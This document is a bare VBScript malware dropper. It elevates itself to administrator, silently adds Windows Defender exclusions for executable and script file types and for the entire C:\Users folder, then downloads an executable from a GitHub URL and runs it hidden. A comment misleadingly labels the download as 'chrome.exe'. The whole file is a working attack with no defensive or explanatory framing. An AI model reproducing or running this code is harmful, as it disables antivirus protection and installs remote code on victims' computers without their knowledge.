If WScript.Arguments.Named.Exists("elevate") = False Then
  CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevate", , "runas", 1
  WScript.Quit
End If

Set objShell = CreateObject("WScript.Shell")

'Add exclusion for .exe extension
objShell.Run "powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension "".exe""", 0, True
'Add exclusion for .ps1 extension
objShell.Run "powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension "".ps1""", 0, True
'Add exclusion for .lnk extension
objShell.Run "powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension "".lnk""", 0, True
'Add exclusion for .src extension
objShell.Run "powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension "".src""", 0, True
'Add exclusion for C:\Users path
objShell.Run "powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath ""C:\Users""", 0, True

'Download and execute chrome.exe
objShell.Run "powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/newuser034/powershell/raw/main/system32.exe -o C:\Users\malware.exe", 0, True
objShell.Run "powershell.exe -w Hidden C:\Users\malware.exe", 0, True